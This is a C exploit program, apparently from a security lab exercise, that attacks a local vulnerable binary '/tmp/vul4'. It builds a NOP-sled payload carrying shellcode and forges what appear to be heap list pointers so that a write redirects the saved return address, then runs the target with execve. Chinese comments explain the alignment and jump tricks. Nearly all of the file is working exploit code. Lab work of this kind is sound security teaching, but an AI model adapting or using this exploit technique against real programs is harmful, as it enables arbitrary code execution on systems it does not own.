#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul4"

int main(void)
{
    char payload[1024] = { 0 };
    memset(payload, 0x90, sizeof(payload) - 1);
    // 需要按照 8 字节对齐
    unsigned int q_offset = 504;
    unsigned int shellcode_offset = 32;
    memcpy(payload + shellcode_offset, shellcode, strlen(shellcode));

    unsigned int buf_addr = 0x804a068;
    unsigned int shellcode_addr = buf_addr + shellcode_offset;
    // ebp = 0xffffda5c
    unsigned int return_addr = 0xffffda5c + 4;

    //! 需要注意的是，这里并不能直接指向 shellcode 的地址
    //! 因为需要 (int)(addr + 4) 是一个奇数,而 *(shellcode + 4) = 0xc0310876 不满足条件
    //! 因此我们需要指向一个 shellcode 前面的一个位置，并通过 nop 滑倒 shellcode
    //! 这里直接将 payload + 4 设置为 0xffffffff
    memset(payload + 4, 0xff, 4);
    // q.l = buf_addr
    memcpy(payload + q_offset, &buf_addr, 4);
    //! 由于 buf_addr + 4 变成了 0xffffffff, 而返回地址位于 buf_addr
    //! 因此需要跳过这 4 个字节
    // eb 6 相对跳转
    // 注意是大端编址
    unsigned short int jmp_4_bytes = 0x6eb;
    memcpy(payload, &jmp_4_bytes, 2);

    // q.r = ebp + 4
    memcpy(payload + q_offset + 4, &return_addr, 4);
    char *args[] = {TARGET, payload, NULL};
    char *env[] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
